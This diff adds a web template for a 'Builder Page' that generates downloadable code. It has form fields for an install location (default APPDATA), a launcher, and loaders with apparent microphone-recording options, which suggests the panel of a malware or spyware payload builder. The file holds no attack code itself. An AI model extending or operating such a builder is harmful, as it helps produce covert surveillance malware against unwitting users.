@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Builder Page</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/builder.css') }}">
+</head>
+<body>
+    <div class="sidebar">
+        <h2>Menu</h2>
+        <ul>
+            <li><a href="{{ url_for('index') }}">Index Page</a></li>
+            <li><a href="{{ url_for('logout') }}">Logout</a></li>
+        </ul>
+    </div>
+    <div class="main-content">
+        <div class="container">
+            <form id="builder-form" action="{{ url_for('builder') }}" method="POST" onsubmit="showOverlay(event)">
+                <label for="karavas_location">Where should karavas live:</label>
+                <input type="text" id="karavas_location" name="karavas_location" value="APPDATA">
+
+                <label for="launcher_name">Launcher Name:</label>
+                <select id="launcher_name" name="launcher_name">
+                {% for launchers in lauchers_list() %}
+                    <option value="{{launchers}}">{{launchers}}</option>
+                {% endfor %}
+                </select>
+
+                <label for="loader_name">Loader Name:</label>
+                <select id="loader_name" name="loader_name" onchange="this.form.submit()">
+                    <option value="none_selected" selected>Select here</option>
+                {% for loaders in loaders_list() %}
+                    <option value="{{loaders}}"{% if loader_name == loaders %}selected{% endif %}>{{loaders}}</option>
+                {% endfor %}
+                </select>
+                {% if (Loaderinfos is defined) and Loaderinfos %}
+                    <label id="selection">{{loader_name}} Selected</label>
+                {%for Loaderinfo in Loaderinfos%}
+                    <div id="microphone-options">
+                    <label for="record-time">{{Loaderinfo[0]}}</label>
+                    <input type="text" id="{{Loaderinfo[1]}}" name="{{Loaderinfo[1]}}" value="RemoveMe" >
+                {%endfor%}
+                {% endif %}
+                <button type="submit">Create Launcher</button>
+            </form>
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+
+    <!-- Overlay for GitHub-like Code Page Interface -->
+    <div id="code-overlay" class="overlay" style="display: none;">
+        <div class="overlay-content">
+            <div class="overlay-header">
+                <span class="close-btn" onclick="closeOverlay()">&times;</span>
+                <h2>Generated Code</h2>
+                <div class="button-group">
+                    <button onclick="downloadCode()">Download</button>
+                    <button onclick="copyCode()">Copy</button>
+                    <button onclick="viewRaw()">Raw</button>
+                </div>
+            </div>
+            <pre id="code-content" class="code-content"></pre>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('builder-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            showOverlay();
+        });
+
+        function showOverlay() {
+            const formData = new FormData(document.getElementById('builder-form'));
+            fetch('{{ url_for("builder") }}', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    extension = data.extension; // Get the file extension from the response
+                    document.getElementById('code-content').textContent = data.generated_code;
+                    document.getElementById('code-overlay').style.display = 'block';
+                } else {
+                    alert('Error: ' + data.error);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        function closeOverlay() {
+            document.getElementById('code-overlay').style.display = 'none';
+        }
+
+        function copyCode() {
+            const codeContent = document.getElementById('code-content').textContent;
+            navigator.clipboard.writeText(codeContent).then(() => {
+                alert('Code copied to clipboard');
+            });
+        }
+
+        function downloadCode() {
+            const codeContent = document.getElementById('code-content').textContent;
+            const blob = new Blob([codeContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'generated_code.' + extension; // Use the extension from the response
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        function viewRaw() {
+            const codeContent = document.getElementById('code-content').textContent;
+            const blob = new Blob([codeContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            window.open(url, '_blank');
+        }
+    </script>
+
+</body>
+</html>
